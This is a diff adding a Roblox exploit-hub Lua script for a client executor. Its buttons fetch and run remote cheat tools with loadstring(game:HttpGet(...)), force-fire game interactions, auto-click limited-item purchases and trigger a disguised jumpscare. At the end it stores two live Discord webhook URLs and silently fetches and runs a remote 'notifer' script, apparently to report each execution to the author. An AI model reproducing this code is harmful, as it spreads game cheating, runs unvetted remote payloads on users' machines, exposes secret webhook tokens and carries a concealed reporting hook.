@@ -1,0 +1,292 @@
+local function Notify(text)
+    local g, label = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui), Instance.new("TextLabel")
+    label.Parent = g
+    label.Text = text 
+    label.Size = UDim2.new(0, 200, 0, 50)
+    label.Position = UDim2.new(0.5, -100, 1, -50)
+    label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    label.TextColor3 = Color3.new(1, 1, 1)
+    label.BackgroundTransparency = 0.5
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 6)
+    corner.Parent = label
+
+    game:GetService("TweenService"):Create(label, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, -100, 0.9, -25)}):Play()
+    wait(3)
+    label:Destroy()
+end
+
+--[[ Anti AFK ]]--
+
+local iku = coroutine.create(function() 
+    local VirtualUser = game:GetService("VirtualUser")
+    game:GetService("Players").LocalPlayer.Idled:Connect(function()
+        VirtualUser:CaptureController()
+        VirtualUser:ClickButton2(Vector2.new())
+    end)
+end) 
+coroutine.resume(iku)
+
+--[[ Random function ]]--
+
+local function ClickDet()
+    spawn(function()
+        for _, descendant in ipairs(workspace:GetDescendants()) do
+            if descendant:IsA("ClickDetector") then
+                task.spawn(function()
+                    fireclickdetector(descendant)
+                end)
+            end
+        end
+    end) 
+end
+
+local function proxi()
+spawn(function()
+    for _, descendant in ipairs(workspace:GetDescendants()) do
+        if descendant:IsA("ProximityPrompt") then
+            fireproximityprompt(descendant)
+        end
+    end
+end) 
+end
+
+local function CframeGen()
+    local plyr = game.Players.LocalPlayer
+    local chr = plyr.Character
+    setclipboard(("game.Players.LocalPlayer.Character:PivotTo(CFrame.new(%s))"):format(tostring(chr:GetPrimaryPartCFrame())))
+end
+
+local function HidePlayer()
+    while true do
+        for _, player in pairs(game.Players:GetPlayers()) do
+            if player ~= game.Players.LocalPlayer and player.Character then
+                player.Character:Destroy()
+            end
+        end
+        wait(5)
+    end
+end
+
+local function DelPP()
+    for _, v in next, workspace:GetDescendants() do
+        if v:IsA("ProximityPrompt") then
+            v.HoldDuration = 0
+        end
+    end
+end
+
+local function Touchinterest()
+    spawn(function()
+        for _, descendant in ipairs(workspace:GetDescendants()) do
+            if descendant:IsA("TouchTransmitter") and
+                    game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.PrimaryPart then
+                task.spawn(function()
+                    firetouchinterest(descendant:FindFirstAncestorWhichIsA("Part"),
+                        game.Players.LocalPlayer.Character.PrimaryPart, 1)
+                    task.wait()
+                    firetouchinterest(descendant:FindFirstAncestorWhichIsA("Part"),
+                        game.Players.LocalPlayer.Character.PrimaryPart, 0)
+                end)
+            end
+        end
+    end)
+end
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
+
+local PhantomForcesWindow = Library:NewWindow("Rass Script")
+
+local WeLoveCat = PhantomForcesWindow:NewSection("Script")
+
+--[[ Hub Script ]] --
+
+WeLoveCat:CreateButton("Infinite Yield", function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+Notify("Infinite Yield Loaded")
+end)
+
+WeLoveCat:CreateButton("RemoteSpy Mobile", function()   loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/RS/main/SimpleSpyMobile"))()
+Notify("SimpleSpy Loaded")
+end)
+
+WeLoveCat:CreateButton("Dark Dex New", function()   loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
+Notify("Dex V3 Loaded")
+end)
+
+WeLoveCat:CreateButton("V1 Player Hub", function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubIngameUgcLimiteds.lua"))()
+Notify("V1 PlayerHub Loaded")
+end)
+
+WeLoveCat:CreateButton("V2 Player Hub", function() loadstring(game:HttpGet(('https://raw.githubusercontent.com/JustAP1ayer/PlayerHubOther/main/PlayerHubIngameUgcLimitedsV2.lua')))()
+  Notify("V2 Player Hub Loaded")
+end)
+
+WeLoveCat:CreateButton("Wyvern", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/artemy133563/Utilities/main/WyvernV2",true))()
+  Notify("Wyvern Loaded")
+end)
+
+WeLoveCat:CreateButton("Wyvern", function() local jumpscareSound = Instance.new("Sound", workspace)
+jumpscareSound.Name = "JumpscareSound"
+jumpscareSound.Volume = 9999999999999999
+jumpscareSound.Pitch = 0.75
+jumpscareSound.SoundId = "rbxassetid://7006487793"
+ 
+local jumpscareGUI = Instance.new("ScreenGui", nil)
+jumpscareGUI.Name = "Jumpscare"
+local image = Instance.new("ImageLabel", jumpscareGUI)
+image.Name = "JumpscareImage"
+image.BackgroundColor3 = Color3.new(0, 0, 0)
+image.BorderColor3 = Color3.new(255, 255, 255)
+image.BorderSizePixel = 0
+image.Size = UDim2.new(1, 0, 1, 0)
+image.Image = "http://www.roblox.com/asset/?id=17328641980"
+image.Active = true
+ 
+for i, c in pairs(game.Players:GetChildren()) do
+    local jumpscareClone = jumpscareGUI:Clone()
+    jumpscareClone.Parent = c.PlayerGui
+end
+jumpscareSound:Play()
+wait(10)
+jumpscareSound:Destroy()
+for i, c in pairs(game.Players:GetChildren()) do
+    c.PlayerGui.Jumpscare:Destroy()
+end
+  Notify("Jumpscare Loaded")
+end)
+
+WeLoveCat:CreateButton("Hydroxide Mobile", function() 
+local owner = "Hosvile"
+local branch = "revision"
+
+local function webImport(file)
+    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/MC-Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
+end
+
+webImport("init")
+webImport("ui/main")
+  Notify("Hydroxide Loaded")
+end)
+
+--[[ 2nd Section UGC Script ]]--
+local WeLoveCat2 = PhantomForcesWindow:NewSection("UGC")  
+
+--[[ Redblue Lim Clicker ]]--
+
+local ClickingSpeed = 0
+local x, y, m = 55, 65.5, 1
+local loopActive = false
+
+WeLoveCat2:CreateToggle("Auto Buy", function(value)  -- Changed WeLoveCat to WeLoveCat2
+    loopActive = value
+    spawn(function()
+        while loopActive do 
+            if game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator:FindFirstChild("Prompt") and
+                game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt:FindFirstChild("AlertContents") and
+                game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents:FindFirstChild("Footer") and
+                game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer:FindFirstChild("Buttons") and
+                game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons:FindFirstChild("2") and
+                game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons[2]:FindFirstChild("ButtonContent").ButtonMiddleContent and
+                game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons[2]:FindFirstChild("ButtonContent").ButtonMiddleContent:FindFirstChildOfClass("TextLabel") and tonumber(
+                game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons[2]:FindFirstChild("ButtonContent").ButtonMiddleContent:FindFirstChildOfClass("TextLabel").Text) <= tonumber(m) then
+
+                local pos = game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator.Prompt.AlertContents.Footer.Buttons[2].AbsolutePosition
+                game:GetService("VirtualInputManager"):SendMouseButtonEvent(pos.X + tonumber(x), pos.Y + tonumber(y), 0, true, game, 1)
+                wait()
+                game:GetService("VirtualInputManager"):SendMouseButtonEvent(pos.X + tonumber(x), pos.Y + tonumber(y), 0, false, game, 1)
+                wait(ClickingSpeed)
+            else
+                wait()
+            end
+        end
+    end)
+Notify("Auto Buy Limited")
+end)
+
+WeLoveCat2:CreateToggle("Auto Close Error", function(value)
+    loopActive = value
+    spawn(function()
+        while loopActive do
+            local pp = game.CoreGui.PurchasePrompt.ProductPurchaseContainer.Animator:FindFirstChild("Prompt")
+            if pp and pp.AlertContents and pp.AlertContents.Footer and pp.AlertContents.Footer.Buttons and not pp.AlertContents.Footer.Buttons:FindFirstChild("2") then
+                if pp.AlertContents.Footer.Buttons:FindFirstChild("1") then
+                    local b1 = pp.AlertContents.Footer.Buttons[1].AbsolutePosition
+                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(b1.X + 55, b1.Y + 65.5, 0, true, game, 1)
+                    wait()
+                    game:GetService("VirtualInputManager"):SendMouseButtonEvent(b1.X + 55, b1.Y + 65.5, 0, false, game, 1)
+                end
+            end
+            wait()
+        end
+    end)
+ Notify("Auto Close Error")
+end)
+
+WeLoveCat2:CreateButton("Cframe Teleport", function() 
+    CframeGen()
+    Notify("Cframe Teleport Copied")
+end)
+
+WeLoveCat2:CreateButton("Cframe Clipboard", function() 
+    setclipboard(game.Players.LocalPlayer.Character.PrimaryPart.CFrame)
+Notify("Cframe Copied")
+end)
+
+WeLoveCat2:CreateButton("Hide Player Loop", function() 
+    HidePlayer()
+    Notify("All Player Are now Invisible")
+end)
+
+WeLoveCat2:CreateButton("Delete Proximity CD", function() 
+    DelPP()
+    Notify("Proximity Deleted")
+end)
+
+--[[ Firing Function 3rd Section ]]--
+
+local WeLoveCat3 = PhantomForcesWindow:NewSection("Firing")
+
+WeLoveCat3:CreateButton("Touchinterests", function()
+    Touchinterest()
+    Notify("Touchinterest Fired")
+end)
+
+WeLoveCat3:CreateButton("Clickedetector", function()
+    ClickDet()
+    Notify("Clickedetector Fired")
+end)
+
+WeLoveCat3:CreateButton("ProximityPrompt", function()
+    proxi()
+    Notify("Proximitypromt Fired")
+end)
+
+--[[ 4th Section Credit ]]--
+
+local WeLoveCat= PhantomForcesWindow:NewSection("Whatsapp Channel")
+
+WeLoveCat:CreateButton("Channels", function()
+setclipboard("https://whatsapp.com/channel/0029VaHheNk4SpkFwASXLd2Q")
+end)
+
+WeLoveCat:CreateButton("Destroy Gui", function()
+game.CoreGui.WizardLibrary:Destroy()
+Notify("Library Destroy")
+end)
+
+getgenv().Title = "Script Executed"
+getgenv().ThumbnailUrl = "https://cdn.discordapp.com/attachments/995675887817207944/1246204035845980233/20240403_034117.jpg?ex=665b8973&is=665a37f3&hm=b13628f90cc14b69f481929c550f0908bfd989b1fddfe3e41be41aa054a5162c&"
+getgenv().Color = 0x000000 -- Black
+
+getgenv().FieldTitle = "Script"
+getgenv().FieldText = "```https://raw.githubusercontent.com/iRasz/Script/main/Universals```"
+
+getgenv().FooterText = "iRasz"
+getgenv().FooterUrl = "https://cdn.discordapp.com/attachments/995675887817207944/1246204035845980233/20240403_034117.jpg?ex=665b8973&is=665a37f3&hm=b13628f90cc14b69f481929c550f0908bfd989b1fddfe3e41be41aa054a5162c&"
+
+getgenv().Webhook = "https://discord.com/api/webhooks/1246205224440565843/CGKoq3Q0OpQdvV_G9qkPfd582jyH-2z_g711CDgECpnA1damXXaG4RHxmnBD8XDBYY3G"
+getgenv().Webhook2 = "https://discord.com/api/webhooks/1248434554377863251/MXIYVKs90EK3pOkBVMMyqpWGvg1lIUVoKIzZ9GsCwttFB0YoM4CtQw7rUtCElKl0LfFh"
+
+coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iRasz/Script/main/notifer", true))()
+end)()
